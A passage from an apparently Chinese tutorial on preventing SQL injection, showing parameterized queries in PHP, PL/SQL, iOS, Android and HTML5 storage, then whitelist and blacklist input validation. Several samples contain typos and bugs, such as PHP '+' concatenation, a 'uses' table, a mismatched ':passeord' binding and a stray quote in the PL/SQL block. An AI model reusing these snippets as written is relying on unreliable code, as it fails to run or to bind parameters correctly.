&lt;span class=&#34;token variable&#34;&gt;$cmd&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;bind_param&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;ss&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//将参数作为字符串绑定&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$cmd&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当在PHP中使用PostgreSQL数据库时，PHP 5.1.0引入了一个简单的方法以便使用参数化的查询语句。该方法名为pg_query_params(),它允许开发人员在同一行代码内提供SQL查询 和参数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_query_params&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM users WHERE username=&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;&lt;/span&gt; AND password=&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$2&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PEAR::MDB2包是一种被广泛使用且独立于供应商的数据库访问框架，MDB2支持使用冒号字符的命名参数和问号占位符两种方式来定义参数。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$mdb2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token class-name static-context&#34;&gt;MDB2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;factory&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$dsn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM users WHERE username=? AND password=?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$types&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;text&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;text&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//设置数据类型&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$cmd&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$mdb2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prepare&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$types&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;MDS2_PREPARE_MANIP&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//要传递的参数&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cmd&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PDO包含在PHP 5.1及之后的版本中。它是一个面向对象且独立于供应商的数据层，用于访问数据库。PDO既支持使用冒号字符的命名参数，也支持使用问号占位符定义的参数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM uses WHERE username=:username AND&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;password=:password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$dbh&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prepare&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//绑定值和数据类型&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;bindParam&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;:username&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name static-context&#34;&gt;PDO&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;PARAM_STR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;bindParam&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;:passeord&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token class-name static-context&#34;&gt;PDO&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;PARAM_STR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;PL-SQL中的参数化语句&#34;&gt;&lt;a href=&#34;#PL-SQL中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;PL/SQL中的参数化语句&#34;&gt;&lt;/a&gt;PL/SQL中的参数化语句&lt;/h4&gt;&lt;p&gt;Oracle PL/SQL同样支持在数据库层代码中使用参数化查询。PL/SQL支持使用带编号的冒号字符(例如:1)来绑定参数。使用带绑定参数的PL/SQL在匿名的 PL/SQL块中构造参数化语句：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-plsql&#34; data-language=&#34;plsql&#34;&gt;&lt;code class=&#34;language-plsql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; username varchar2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
password varchar2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;result&lt;/span&gt; integer&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;Execute&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;immediate&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&#39; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;using&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;移动应用中的参数化语句&#34;&gt;&lt;a href=&#34;#移动应用中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;移动应用中的参数化语句&#34;&gt;&lt;/a&gt;移动应用中的参数化语句&lt;/h3&gt;&lt;p&gt;基于iOS和Android的设备都具有内建于设备(in-device)的数据库支持，并提供了创建、更新和查询这些数据库的API。&lt;/p&gt;
&lt;h4 id=&#34;iOS应用程序中的参数化语句&#34;&gt;&lt;a href=&#34;#iOS应用程序中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;iOS应用程序中的参数化语句&#34;&gt;&lt;/a&gt;iOS应用程序中的参数化语句&lt;/h4&gt;&lt;p&gt;对于iOS系统，用于开发应用的API通过SQLite库libsqlite3.dylib支持SQLite。如果直接使用SQLite(而不是通过Apple框架Core Data),那么最流行的框架是FMDB。使用FMDB框架时，可以使用executeUpdate()方法构建参数化的insert语句：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sqlite&#34; data-language=&#34;sqlite&#34;&gt;&lt;code class=&#34;language-sqlite&#34;&gt;[db executeUpdate:@&#34;INSERT INTO artists (name) VALUES (?)&#34;,@&#34;Sinead O&#39;Connor&#34;];&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;与之类似，如果想查询数据库，可以使用executeQuery()方法：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sqlite&#34; data-language=&#34;sqlite&#34;&gt;&lt;code class=&#34;language-sqlite&#34;&gt;FMResultSet *rs = [db executeQuery:@&#34;SELECT * FROM songs WHERE artist=?&#34;,@&#34;Sinead O&#39;Connor&#34;];&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Android应用程序中的参数化语句&#34;&gt;&lt;a href=&#34;#Android应用程序中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;Android应用程序中的参数化语句&#34;&gt;&lt;/a&gt;Android应用程序中的参数化语句&lt;/h4&gt;&lt;p&gt;Android设备也包含了用于访问SQLite数据库子系统的AM。该API支持参数化语句，开发人员可以分别提供查询和数据。&lt;/p&gt;
&lt;p&gt;对于insert语句，可以使用SQLiteStatement类：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sqlite&#34; data-language=&#34;sqlite&#34;&gt;&lt;code class=&#34;language-sqlite&#34;&gt;statement = db.compileStatement(&#34;INSERT INTO artists (name) VALUES (?)&#34;);
statement.bind(1, &#34;Sinead O&#39;Connor&#34;);
statement.executeInsert();&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当查询数据库时，只须在SQLite-Database对象上直接使用query()&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sqlite&#34; data-language=&#34;sqlite&#34;&gt;&lt;code class=&#34;language-sqlite&#34;&gt;db.query(&#34;songs&#34;,
new String[ ] { &#34;title&#34; } /* columns to return */, &#34;artist = ?&#34; /* where clause */,
new String [ ] { &#34;Sinead O&#39;Connor&#34; } /* parameters to bind */,
null /* group by */,
null /* having */,
null /* order by */
);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;HTML5浏览器存储中的参数化语句&#34;&gt;&lt;a href=&#34;#HTML5浏览器存储中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;HTML5浏览器存储中的参数化语句&#34;&gt;&lt;/a&gt;HTML5浏览器存储中的参数化语句&lt;/h4&gt;&lt;p&gt;在HTML5标准中可以使用两种类型的存储——Web SQL Database规范和Web Storage规范。该规范中包含了一个简单的方法用于创建参数化查询，即使用executeSql())方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;executeSql&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT * FROM songs WHERE artist=? AND song=?&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;artist&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; songName&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; {
&lt;span class=&#34;token comment&#34;&gt;//对数据执行某些操作&lt;/span&gt;
}&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在上面的代码中，t代表事务(transaction), SQL语句将在该事务中执行。在SQL语句中使用问号作为占位符，并提供了一个参数数组，该数组中元素的顺序就是这些参数应用于SQL 语句的顺序。最后一个参数是回调函数，用于处理从数据库返回的数据。&lt;/p&gt;
&lt;p&gt;Web Storage规范则使用setltem()、getltem()和removeltem()等方法，提供了一种简单的键/值对的存储方式。在该规范中并没有通过字符串连接来构建语句的查询语言，因此类似于SQL 注入这样的攻击对Web Storage无效。&lt;/p&gt;
&lt;h3 id=&#34;输入验证&#34;&gt;&lt;a href=&#34;#输入验证&#34; class=&#34;headerlink&#34; title=&#34;输入验证&#34;&gt;&lt;/a&gt;输入验证&lt;/h3&gt;&lt;p&gt;输入验证是指测试应用程序接收到的输入，以保证其符合应用程序中标准定义的过程。它可以简单到将参数限制成某种类型，也可以复杂到使用正则表达式或业务逻辑来验证输入。&lt;/p&gt;
&lt;p&gt;白名单验证(有时称为包含验证或正验证)和黑名单验证(有时称 为排除验证或负验证)。&lt;/p&gt;
&lt;h4 id=&#34;白名单&#34;&gt;&lt;a href=&#34;#白名单&#34; class=&#34;headerlink&#34; title=&#34;白名单&#34;&gt;&lt;/a&gt;白名单&lt;/h4&gt;&lt;p&gt;白名单验证是只接收已记录在案的良好输入的操作。&lt;/p&gt;
&lt;p&gt;要点:&lt;/p&gt;
&lt;p&gt;输入的数据是否在白名单规则内&lt;/p&gt;
&lt;p&gt;数据类型是否满足&lt;/p&gt;
&lt;p&gt;数据大小是否正确&lt;/p&gt;
&lt;p&gt;数据范围&lt;/p&gt;
&lt;p&gt;数据内容&lt;/p&gt;
&lt;p&gt;实现内容验证的常用方法是使用正则表达式。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#验证字符串中是否包含美国邮政编码：&lt;/span&gt;
^&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;-&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;?$&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;该正则表达式按下列规则匹配5位和5位加4位的邮政编码：&lt;/p&gt;
&lt;p&gt;^\d{5}：准确匹配字符串开头的5位数字&lt;/p&gt;
&lt;p&gt;(-\d{4})?：准确匹配可能存在（出现）或完全不存在（未出现）的破折号字符加4位数字。&lt;/p&gt;
&lt;p&gt;$:出现在字符串末尾。如果字符串末尾包含附加的内容，正则表达式将不匹配。&lt;/p&gt;
&lt;p&gt;设计输入验证和处理策略&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在应用程序输入层使用白名单输入验证以便验证所有用户输入都符合应用要接 收的内容。应用只允许接收符合期望格式的输入。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在客户端浏览器上同样执行白名单输入验证，这样可以防止为用户输入不可接 收的数据时服务器和浏览器间的往返传递。不能将该操作作为安全控制手段，因为攻击者可以修改来自用户浏览器的所有数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在Web应用防火墙（WAF）层使用黑名单和白名单输入验证（以漏洞“签名”和“有 经验”行为的形式）以便提供入侵检测/阻止功能和监视应用攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在应用程序中自始自终地使用参数化语句以保证执行安全的SQL执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在数据库中使用编码技术以便在动态SQL中使用输入时安全地对其编码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在使用从数据库中提取的数据之前恰当地对其进行编码。例如，将浏览器中显示的数据针对跨站脚本进行编码。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;用已知值进行检验&#34;&gt;&lt;a href=&#34;#用已知值进行检验&#34; class=&#34;headerlink&#34; title=&#34;用已知值进行检验&#34;&gt;&lt;/a&gt;用已知值进行检验&lt;/h5&gt;&lt;p&gt;将输入值与一个有效值的列表进行比较，如果输入值不在列表中，就拒绝该输入，这是一种强大但常常未被充分利用的检验输入值的方法。通过将值与一个列表进行比较，可以完全控制可能的输入值以及输入可能通过的代码路径。&lt;/p&gt;
&lt;p&gt;间接输入(input indirection)是另一种用已知值进行检验的方法。在这种方法中，服务器端并不接收直接来自客户端的值，客户端呈现一个允许值的列表，并向服务器端提交选中值的索引。&lt;/p&gt;
&lt;h4 id=&#34;黑名单&#34;&gt;&lt;a href=&#34;#黑名单&#34; class=&#34;headerlink&#34; title=&#34;黑名单&#34;&gt;&lt;/a&gt;黑名单&lt;/h4&gt;&lt;p&gt;黑名单验证是只拒绝己记录在案的不良输入的操作，它通过浏览输入的内容来查找是否存在己知的不良字符、字符串或模式。&lt;/p&gt;
&lt;p&gt;在使用黑名单的同时结合使用输出编码以保证对传递到其他位置（比如，传递给数据库）的输入进行附加检查，从而保证能正确地处理该输入以防止SQL注入。&lt;/p&gt;
&lt;h4 id=&#34;Java中的输入验证&#34;&gt;&lt;a href=&#34;#Java中的输入验证&#34; class=&#34;headerlink&#34; title=&#34;Java中的输入验证&#34;&gt;&lt;/a&gt;Java中的输入验证&lt;/h4&gt;&lt;p&gt;Java中的输入验证支持专属于正在使用的框架。&lt;/p&gt;
&lt;p&gt;定义一个输入验证类，该类实现了&lt;code&gt;javax.faces.validator.Validator&lt;/code&gt;接口&lt;/p&gt;
&lt;p&gt;请参考下列代码片段并将其作为验证JSF(Java Server Faces, JSF)中用户名的例子&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;UsernameValidator&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Validator&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;FacesContext&lt;/span&gt; facesContext&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
